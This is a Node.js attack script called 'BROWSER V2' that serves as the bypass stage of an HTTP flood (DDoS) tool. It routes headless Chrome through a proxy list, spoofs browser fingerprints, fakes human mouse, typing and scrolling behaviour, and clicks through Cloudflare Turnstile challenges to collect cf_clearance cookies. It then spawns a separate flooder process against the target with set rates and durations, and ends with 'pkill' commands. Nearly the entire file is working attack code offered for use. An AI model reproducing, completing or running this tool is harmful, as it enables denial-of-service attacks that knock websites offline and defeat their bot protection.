const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const puppeteerStealth = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { exec } = require('child_process');
const { spawn } = require('child_process');
const chalk = require('chalk');

// Error handler function
function errorHandler(error) {
    console.log(error);
}

// Set up error handlers
process.on('uncaughtException', errorHandler);
process.on('unhandledRejection', errorHandler);

// Add remove method to Array prototype
Array.prototype.remove = function(item) {
    const index = this.indexOf(item);
    if (index !== -1) this.splice(index, 1);
    return item;
};

// Generate random number between min and max
function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Get random element from array
function randomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
}

// Color constants for terminal output
const colors = {
    'COLOR_RED': '\x1b[31m',
    'COLOR_GREEN': '\x1b[32m',
    'COLOR_YELLOW': '\x1b[33m',
    'COLOR_RESET': '\x1b[0m',
    'COLOR_PURPLE': '\x1b[35m',
    'COLOR_CYAN': '\x1b[36m',
    'COLOR_BLUE': '\x1b[34m',
    'COLOR_BRIGHT_RED': '\x1b[91m',
    'COLOR_BRIGHT_GREEN': '\x1b[92m',
    'COLOR_BRIGHT_YELLOW': '\x1b[93m',
    'COLOR_BRIGHT_BLUE': '\x1b[94m',
    'COLOR_BRIGHT_PURPLE': '\x1b[95m',
    'COLOR_BRIGHT_CYAN': '\x1b[96m',
    'COLOR_BRIGHT_WHITE': '\x1b[97m',
    'BOLD': '\x1b[1m',
    'ITALIC': '\x1b[3m'
};

// Print colored text to console
function colored(color, text) {
    console.log(color + text + colors.COLOR_RESET);
}

// Random wait function
function nmwaitpage() {
    const minTime = 7000;
    const maxTime = 14000;
    const randomTime = Math.floor(Math.random() * (maxTime - minTime + 1)) + minTime;
    return new Promise(resolve => setTimeout(resolve, randomTime));
}

// Simulate human-like mouse movement
async function simulateHumanMouseMovement(page, element, options = {}) {
    const {
        minMoves = 5,
        maxMoves = 10,
        minDelay = 50,
        maxDelay = 150,
        jitterFactor = 0.1,
        overshootChance = 0.2,
        hesitationChance = 0.1,
        finalDelay = 500
    } = options;
    
    const box = await element.boundingBox();
    if (!box) throw new Error('Element not visible');
    
    const targetX = box.x + box.width / 2;
    const targetY = box.y + box.height / 2;
    
    const viewport = await page.evaluate(() => ({
        width: window.innerWidth,
        height: window.innerHeight
    }));
    
    let currentX = Math.random() * viewport.width;
    let currentY = Math.random() * viewport.height;
    
    const numMoves = Math.floor(Math.random() * (maxMoves - minMoves + 1)) + minMoves;
    
    for (let i = 0; i < numMoves; i++) {
        const progress = i / (numMoves - 1);
        let nextX = currentX + (targetX - currentX) * progress;
        let nextY = currentY + (targetY - currentY) * progress;
        
        nextX += (Math.random() * 2 - 1) * jitterFactor * box.width;
        nextY += (Math.random() * 2 - 1) * jitterFactor * box.height;
        
        if (Math.random() < overshootChance && i < numMoves - 1) {
            nextX += (Math.random() * 0.5 + 0.5) * (nextX - currentX);
            nextY += (Math.random() * 0.5 + 0.5) * (nextY - currentY);
        }
        
        await page.mouse.move(nextX, nextY, { steps: 10 });
        
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        
        if (Math.random() < hesitationChance) {
            await new Promise(resolve => setTimeout(resolve, delay * 3));
        }
        
        currentX = nextX;
        currentY = nextY;
    }
    
    await page.mouse.move(targetX, targetY, { steps: 5 });
    await new Promise(resolve => setTimeout(resolve, finalDelay));
}

// Simulate human-like typing
async function simulateHumanTyping(page, element, text, options = {}) {
    const {
        minDelay = 30,
        maxDelay = 100,
        mistakeChance = 0.05,
        pauseChance = 0.02
    } = options;
    
    await simulateHumanMouseMovement(page, element);
    await element.focus();
    await element.evaluate(el => el.value = '');
    
    for (let i = 0; i < text.length; i++) {
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        
        if (Math.random() < mistakeChance) {
            const wrongChar = String.fromCharCode(65 + Math.floor(Math.random() * 26));
            await page.keyboard.press(wrongChar);
            await new Promise(resolve => setTimeout(resolve, delay * 2));
            await page.keyboard.press('Backspace');
            await new Promise(resolve => setTimeout(resolve, delay));
        }
        
        await page.keyboard.press(text[i]);
        
        if (Math.random() < pauseChance) {
            await new Promise(resolve => setTimeout(resolve, delay * 10));
        }
    }
}

// Simulate human-like scrolling
async function simulateHumanScrolling(page, scrollAmount, options = {}) {
    const {
        minSteps = 5,
        maxSteps = 15,
        minDelay = 50,
        maxDelay = 200,
        direction = 'down',
        pauseChance = 0.2,
        jitterFactor = 0.1
    } = options;
    
    const directionMultiplier = direction === 'up' ? -1 : 1;
    const numSteps = Math.floor(Math.random() * (maxSteps - minSteps + 1)) + minSteps;
    const stepSize = scrollAmount / numSteps;
    
    let scrolled = 0;
    
    for (let i = 0; i < numSteps; i++) {
        const jitter = stepSize * jitterFactor * (Math.random() * 2 - 1);
        let step = Math.round(stepSize + jitter);
        
        if (i === numSteps - 1) {
            step = (scrollAmount - scrolled) * directionMultiplier;
        } else {
            step = step * directionMultiplier;
        }
        
        await page.evaluate(amount => {
            window.scrollBy(0, amount);
        }, step);
        
        scrolled += step * directionMultiplier;
        
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        
        if (Math.random() < pauseChance) {
            await new Promise(resolve => setTimeout(resolve, delay * 6));
        }
    }
}

// Simulate natural page behavior
async function simulateNaturalPageBehavior(page) {
    const viewport = await page.evaluate(() => ({
        width: document.documentElement.clientWidth,
        height: document.documentElement.clientHeight,
        scrollHeight: document.documentElement.scrollHeight
    }));
    
    const scrollAmount = Math.floor(viewport.scrollHeight * (0.2 + Math.random() * 0.6));
    await simulateHumanScrolling(page, scrollAmount, {
        minSteps: 8,
        maxSteps: 15,
        pauseChance: 0.3
    });
    
    await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 3000));
    
    const numMoves = 2 + Math.floor(Math.random() * 4);
    for (let i = 0; i < numMoves; i++) {
        const x = Math.floor(Math.random() * viewport.width * 0.8) + viewport.width * 0.1;
        const y = Math.floor(Math.random() * viewport.height * 0.8) + viewport.height * 0.1;
        
        await page.mouse.move(x, y, {
            steps: 10 + Math.floor(Math.random() * 20)
        });
        
        await new Promise(resolve => setTimeout(resolve, 200 + Math.random() * 1000));
    }
    
    if (Math.random() > 0.5) {
        await simulateHumanScrolling(page, scrollAmount / 2, {
            direction: 'up',
            minSteps: 3,
            maxSteps: 8
        });
    }
}

// Spoof browser fingerprint
async function spoofFingerprint(page) {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(window, 'screen', {
            value: {
                width: 1920,
                height: 1080,
                availWidth: 1920,
                availHeight: 1080,
                colorDepth: 64,
                pixelDepth: 64
            }
        });
        
        Object.defineProperty(navigator, 'userAgent', {
            value: userAgent
        });
        
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (gl) {
            const getParameter = gl.getParameter;
            gl.getParameter = function (param) {
                if (param === gl.VENDOR) return 'Intel Inc.';
                else if (param === gl.RENDERER) return 'Intel Iris OpenGL Engine';
                else return getParameter.call(this, param);
            };
        }
        
        Object.defineProperty(navigator, 'plugins', {
            value: [{
                name: 'Chrome PDF Plugin',
                filename: 'internal-pdf-viewer',
                description: 'Portable Document Format',
                length: 1
            }]
        });
        
        Object.defineProperty(navigator, 'languages', {
            value: ['en-US', 'en']
        });
        
        Object.defineProperty(navigator, 'doNotTrack', {
            get: () => null
        });
        
        Object.defineProperty(navigator, 'hardwareConcurrency', {
            value: 4
        });
        
        Object.defineProperty(navigator, 'deviceMemory', {
            value: 8
        });
        
        Object.defineProperty(document, 'cookie', {
            configurable: true,
            enumerable: true,
            get: function () {
                return '';
            },
            set: function () {}
        });
        
        Object.defineProperty(navigator, 'webdriver', {
            configurable: true,
            enumerable: true,
            get: function () {
                return false;
            },
            set: function () {}
        });
        
        Object.defineProperty(window, 'localStorage', {
            configurable: true,
            enumerable: true,
            value: {
                getItem: function () {
                    return null;
                },
                setItem: function () {},
                removeItem: function () {}
            }
        });
        
        Object.defineProperty(navigator, 'permissions', {
            value: null
        });
        
        Object.defineProperty(navigator, 'maxTouchPoints', {
            value: 10
        });
        
        Object.defineProperty(navigator, 'platform', {
            value: 'en-US'
        });
        
        Object.defineProperty(navigator, 'vendor', {
            value: ''
        });
    });
}

// Set up stealth plugin
const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);

// Validate command line arguments
if (process.argv.length < 8) {
    console.clear();
    console.log(colors.COLOR_RESET + chalk.cyanBright('BROWSER V2') + 
              colors.COLOR_RESET + ' | Updated: May 6, 2025\n    \n    ' + 
              chalk.yellowBright('Usage:') + '\n' + 
              chalk.blueBright('Example: node ' + process.argv[1] + ' https://example.com 60 5 2 30 proxy.txt') + 
              '\n' + chalk.greenBright('Arguments: <target> <duration> <threads browser> <threads flood> <rates> <proxy>') + '\n');
    process.exit(1);
}

// Parse command line arguments
const targetURL = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const thread = parseInt(process.argv[5]);
const rates = process.argv[6];
const proxyFile = process.argv[7];
const urlObj = new URL(targetURL);

// Sleep function
const sleep = seconds => new Promise(resolve => setTimeout(resolve, seconds * 1000));

// Validate URL
if (!/^https?:\/\//i.test(targetURL)) {
    console.log('URL must start with http:// or https://');
    process.exit(1);
}

// Read proxies from file
const readProxiesFromFile = filename => {
    try {
        const data = fs.readFileSync(filename, 'utf8');
        const proxies = data.trim().split(/\r?\n/);
        return proxies;
    } catch (error) {
        console.log('Error reading proxies file:', error);
        return [];
    }
};

const proxies = readProxiesFromFile(proxyFile);

// Generate random user agent
const rd = generateRandomNumber(100, 135);
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + rd + '.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + rd + '.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + rd + '.0.0.0 Safari/537.36'
];
const userAgent = randomElement(userAgents);

// Solve Cloudflare captcha
async function solvingCaptcha(browser, page, proxy) {
    async function waitForAnyElement(page, selectors, timeout = 10000, interval = 1000) {
        const startTime = Date.now();
        
        while (Date.now() - startTime < timeout) {
            for (const selector of selectors) {
                let element = null;
                try {
                    if (page.elementHandle) {
                        element = await page.elementHandle.evaluateHandle((el, selector) => {
                            return el.querySelector(selector) || (el.shadowRoot ? el.shadowRoot.querySelector(selector) : null);

                        }, selector);
                    } else {
                        element = await page.$(selector);
                    }
                    
                    if (element && await element.evaluate(el => el.offsetParent && el instanceof HTMLElement)) {
                        return element;
                    }
                    
                    if (element) {
                        await element.dispose();
                    }
                } catch (error) {}
                
                await new Promise(resolve => setTimeout(resolve, interval));
            }
        }
        
        return null;
    }
    
    async function isElementVisible(element) {
        try {
            return await element.evaluate(el => {
                if (!(el instanceof HTMLElement)) return false;
                const style = window.getComputedStyle(el);
                return style.display !== 'none' && 
                       style.visibility !== 'hidden' && 
                       style.opacity !== '0' && 
                       el.offsetParent !== null;
            });
        } catch {
            return false;
        }
    }
    
    async function clickElementWithRetry(element, retries = 5, delay = 50) {
        for (let i = 0; i < retries; i++) {
            for (let j = 0; j < 3; j++) {
                try {
                    if (await element.evaluate(el => el.click) && await isElementVisible(element)) {
                        await element.click();
                        await new Promise(resolve => setTimeout(resolve, delay));
                        break;
                    }
                    
                    await element.evaluate(el => {
                        if (el instanceof HTMLElement) el.focus();
                    });
                    await new Promise(resolve => setTimeout(resolve, delay));
                    break;
                } catch (error) {
                    if (j === 2) throw new Error('Click failed: ' + error.message);
                    await new Promise(resolve => setTimeout(resolve, 100));
                }
            }
        }
    }
    
    try {
        const title = await page.title();
        
        if (title.includes('Just a moment...') || 
            title.includes('cloudflare.challenges.com') || 
            title === 'Attention Required! | Cloudflare') {
            
            colored(colors.COLOR_YELLOW, '[INFO] Cloudflare challenge detected');
            colored(colors.COLOR_YELLOW, '[INFO] Proxy: ' + proxy + ' - Attempting to solve challenge...');
            await nmwaitpage();
            
            for (let attempt = 1; attempt <= 2; attempt++) {
                try {
                    const challengeDivSelectors = [
                        'body > div.main-wrapper > div > div > div > div',
                        'div.main-wrapper',
                        'div[role="dialog"]',
                        'div[class*="challenge"]',
                        'div.cf-turnstile'
                    ];
                    
                    const challengeDiv = await waitForAnyElement(page, challengeDivSelectors, 5000);
                    if (challengeDiv) {
                        colored(colors.COLOR_BRIGHT_BLUE, '[DEBUG] Found captcha div with proxy: ' + proxy);
                        await clickElementWithRetry(challengeDiv, 5, 50);
                    }
                    
                    const iframeSelectors = [
                        'iframe[title*="challenge"]',
                        'iframe.cf-challenge',
                        '.cf-iframe',
                        'div > iframe',
                        'iframe'
                    ];
                    
                    const iframe = await waitForAnyElement(page, iframeSelectors, 5000);
                    if (iframe) {
                        colored(colors.COLOR_BRIGHT_BLUE, '[DEBUG] Found challenge iframe with proxy: ' + proxy);
                        await clickElementWithRetry(iframe, 5, 50);
                    }
                    
                    const buttonSelectors = [
                        'div > button',
                        'button',
                        'button.turnstile__button',
                        '[data-action="solve-turnstile"]',
                        '#turnstile-button'
                    ];
                    
                    const button = await waitForAnyElement(page, buttonSelectors, 5000);
                    if (!button) continue;
                    
                    let iframeContent = null;
                    for (let i = 0; i < 3; i++) {
                        iframeContent = await button.contentFrame();
                        if (iframeContent) break;
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                    
                    if (!iframeContent) {
                        colored(colors.COLOR_RED, '[ERROR] Cannot access iframe');
                        continue;
                    }
                    
                    const inputSelectors = [
                        'input',
                        '[name="cf-turnstile-response"]',
                        'input[name="custom-turnstile-response"]',
                        '.turnstile__input',
                        'div > input',
                        '#custom-turnstile',
                        'div.custom-turnstile',
                        'input.turnstile__input',
                        '[name="cf-turnstile-response"]',
                        'input[name="custom-turnstile-response"]'
                    ];
                    
                    const input = await waitForAnyElement(iframeContent, inputSelectors, 5000);
                    if (!input) continue;
                    
                    await clickElementWithRetry(input, 5, 50);
                    colored(colors.COLOR_BLUE, '[DEBUG] Challenge button clicked');
                    
                    const newTitle = await page.title();
                    if (newTitle.includes('cloudflare.challenges.com') || newTitle.includes('Just a moment...')) {
                        colored(colors.COLOR_BLUE, '[DEBUG] Challenge not resolved, retry ' + attempt + '/2 with proxy: ' + proxy);
                        continue;
                    }
                    
                    colored(colors.COLOR_GREEN, '[DEBUG] Challenge resolved with proxy: ' + proxy);
                    return true;
                } catch (error) {
                    if (error.message.includes('Element not visible') || error.message.includes('Click failed')) {
                        colored(colors.COLOR_YELLOW, '[DEBUG] Node issue, retrying attempt ' + attempt + '/2 with proxy: ' + proxy);
                        continue;
                    }
                    throw error;
                }
            }
            
            return false;
        }
        
        colored(colors.COLOR_BLUE, '[DEBUG] No Cloudflare challenge detected');
        return true;
    } catch (error) {
        colored(colors.COLOR_RED, '[ERROR] Failed to solve challenge with proxy: ' + error);
        return false;
    }
}

// Launch browser with retry mechanism
async function launchBrowserWithRetry(url, proxy, retryCount = 1, maxRetries = 2) {
    let browser;
    
    const options = {
        headless: true,
        args: [
            '--proxy-server=' + proxy,
            '--user-agent=' + userAgent,
            '--disable-background-timer-throttling',
            '--disable-backgrounding-occluded-windows',
            '--disable-renderer-backgrounding',
            '--disable-features=TranslateUI',
            '--disable-ipc-flooding-protection',
            '--enable-unsafe-swiftshader',
            '--disable-dev-shm-usage',
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-gpu',
            '--disable-software-rasterizer',
            '--disable-extensions',
            '--disable-notifications',
            '--disable-popup-blocking',
            '--disable-web-security',
            '--disable-features=VizDisplayCompositor',
            '--disable-field-trial-config',
            '--disable-background-networking',
            '--enable-features=NetworkService,NetworkServiceInProcess',
            '--disable-breakpad',
            '--disable-client-side-phishing-detection',
            '--disable-crash-reporter',
            '--disable-default-apps',
            '--disable-extensions-except=' + stealthPlugin,
            '--disable-component-extensions-with-background-pages',
            '--disable-hang-monitor',
            '--disable-ipc-flooding-protection',
            '--disable-prompt-on-repost',
            '--disable-sync',
            '--force-color-profile=srgb',
            '--metrics-recording-only',
            '--no-first-run',
            '--enable-automation',
            '--password-store=basic',
            '--use-mock-keychain',
            '--single-process',
            '--disable-web-security',
            '--aggressive-cache-discard',
            '--disable-cache',
            '--disable-application-cache',
            '--disable-offline-load-stale-cache',
            '--disable-gpu-shader-disk-cache',
            '--media-cache-size=0',
            '--disk-cache-size=0',
            '--disable-features=TranslateUI',
            '--disable-ipc-flooding-protection',
            '--enable-unsafe-swiftshader',
            '--disable-dev-shm-usage',
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-gpu',
            '--disable-software-rasterizer',
            '--disable-extensions',
            '--disable-notifications',
            '--disable-popup-blocking',
            '--disable-web-security',
            '--disable-features=VizDisplayCompositor',
            '--disable-field-trial-config',
            '--disable-background-networking',
            '--enable-features=NetworkService,NetworkServiceInProcess',
            '--disable-breakpad',
            '--disable-client-side-phishing-detection',
            '--disable-crash-reporter',
            '--disable-default-apps',
            '--disable-extensions-except=' + stealthPlugin,
            '--disable-component-extensions-with-background-pages',
            '--disable-hang-monitor',
            '--disable-ipc-flooding-protection',
            '--disable-prompt-on-repost',
            '--disable-sync',
            '--force-color-profile=srgb',
            '--metrics-recording-only',
            '--no-first-run',
            '--enable-automation',
            '--password-store=basic',
            '--use-mock-keychain',
            '--single-process',
            '--disable-web-security',
            '--aggressive-cache-discard',
            '--disable-cache',
            '--disable-application-cache',
            '--disable-offline-load-stale-cache',
            '--disable-gpu-shader-disk-cache',
            '--media-cache-size=0',
            '--disk-cache-size=0'
        ],
        defaultViewport: {
            width: 360,
            height: 640,
            deviceScaleFactor: 3,
            isMobile: true,
            hasTouch: Math.random() < 0.5,
            isLandscape: false
        }
    };
    
    try {
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();
        const client = page._client();
        
        await spoofFingerprint(page);
        
        page.on('framenavigated', frame => {
            if (frame.url().includes('challenges.cloudflare.com')) {
                client.send('Target.detachFromTarget', {
                    targetId: frame._id
                }).catch(() => {});
            }
        });
        
        page.setDefaultNavigationTimeout(60 * 1000);
        
        await page.goto(url, {
            waitUntil: 'domcontentloaded'
        });
        
        await simulateNaturalPageBehavior(page);
        await solvingCaptcha(browser, page, proxy);
        
        const title = await page.title();
        const cookies = await page.cookies(url);
        
        if (!cookies || !cookies.some(c => c.name === 'cf_clearance' && c.value.trim().length > 10)) {
            colored(colors.COLOR_RED, '[ERROR] No cookies with proxy: ' + proxy);
            return;
        }
        
        const cookieString = cookies.map(c => c.name + '=' + c.value).join('; ').trim();
        
        await browser.close();
        
        return {
            title: title,
            browserProxy: proxy,
            cookies: cookieString,
            userAgent: userAgent
        };
    } catch (error) {
        if (browser) {
            await browser.close().catch(() => {});
        }
    }
}

// Cookie counter
let cookieCount = 0;

// Start thread function
async function startthread(url, proxy, task, callback, retryCount = 0) {
    if (retryCount === 1) {
        const currentTask = queue.length();
        callback(null, {
            task: task,
            currentTask: currentTask
        });
        return;
    }
    
    try {
        const result = await launchBrowserWithRetry(url, proxy);
        
        if (result) {
            if (result.title === 'Attention Required! | Cloudflare') {
                colored(colors.COLOR_RED, '[INFO] Blocked by Cloudflare. Exiting.');
                return;
            }
            
            if (!result.cookies) {
                colored(colors.COLOR_RED, '[ERROR] No cookies with proxy: ' + proxy);
                return;
            }
            
            cookieCount++;
            
            const message = '[INFO] Total solve: ' + cookieCount + 
                           '\n[INFO] Title: ' + result.title + 
                           '\n[INFO] Proxy: ' + proxy + 
                           '\n[INFO] Cookies: ' + result.cookies + 
                           '\n[INFO] Useragent: ' + result.userAgent;
            
            colored(colors.COLOR_GREEN, message);
            
            try {
                spawn('node', [url, duration, thread, result.browserProxy, rates, result.cookies, result.userAgent]);
            } catch (error) {
                colored(colors.COLOR_RED, '[INFO] Error spawning g.js: ' + error.message);
            }
            
            callback(null, {
                task: task
            });
        } else {
            await startthread(url, proxy, task, callback, retryCount + 1);
        }
    } catch (error) {
        console.log('[ERROR] Error in startthread for proxy ' + proxy + ': ' + error.message);
        await startthread(url, proxy, task, callback, retryCount + 1);
    }
}

// Set up async queue
const queue = async.queue(function (task, callback) {
    startthread(targetURL, task.browserProxy, task, callback);
}, threads);

queue.drain(function () {
    colored(colors.COLOR_GREEN, '[INFO] All proxies processed');
    process.exit(1);
});

// Main function
async function main() {
    if (proxies.length === 0) {
        colored(colors.COLOR_RED, '[ERROR] No proxies found in file. Exiting.');
        process.exit(1);
    }
    
    for (let i = 0; i < proxies.length; i++) {
        const proxy = proxies[i];
        queue.push({
            browserProxy: proxy
        });
    }
    
    setTimeout(() => {
        colored(colors.COLOR_YELLOW, '[INFO] Time\'s up! Cleaning up...');
        queue.kill();
        
        exec('pkill -f g.js', (error) => {
            if (error && error.code !== 1) {} else {
                colored(colors.COLOR_GREEN, '[INFO] Successfully killed g.js processes');
            }
        });
        
        exec('pkill -f chrome', (error) => {
            if (error && error.code !== 1) {} else {
                colored(colors.COLOR_GREEN, '[INFO] Successfully killed Chrome processes');
            }
        });
        
        setTimeout(() => {
            colored(colors.COLOR_GREEN, '[INFO] Exiting');
            process.exit(0);
        }, 5000);
    }, duration * 1000);
}

// Display initial information
console.clear();
colored(colors.COLOR_GREEN, '[INFO] Running...');
colored(colors.COLOR_GREEN, '[INFO] Target: ' + targetURL);
colored(colors.COLOR_GREEN, '[INFO] Duration: ' + duration + ' seconds');
colored(colors.COLOR_GREEN, '[INFO] Threads Browser: ' + threads);
colored(colors.COLOR_GREEN, '[INFO] Threads Flooder: ' + thread);
colored(colors.COLOR_GREEN, '[INFO] Rates Flooder: ' + rates);
colored(colors.COLOR_GREEN, '[INFO] Proxies: ' + proxies.length + ' from ' + proxyFile);

// Start main function
main().catch(error => {
    colored(colors.COLOR_RED, '[ERROR] Main function error: ' + error.message);
    process.exit(1);
});